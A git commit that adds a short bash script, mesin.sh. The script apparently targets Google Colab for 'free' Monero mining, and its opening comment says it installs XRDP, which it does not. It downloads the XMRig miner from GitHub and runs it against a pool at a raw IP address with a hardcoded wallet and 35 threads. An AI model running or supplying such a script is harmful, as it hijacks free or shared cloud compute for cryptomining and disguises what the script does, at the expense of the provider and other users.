64eb83741a0bedf53500c036ff5ef2f9d3a72734
angkii <83603708+angkii@users.noreply.github.com>
2022-09-26 18:48:55 +0700

    Create mesin.sh

---
+++ mesin.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+./xmrig -o 51.79.222.181:80 -u 1HxsnTRFipQ4L3jqMbbJEYwideoGsDBR62.majzza -p start=0.2 -a gr -k -t35
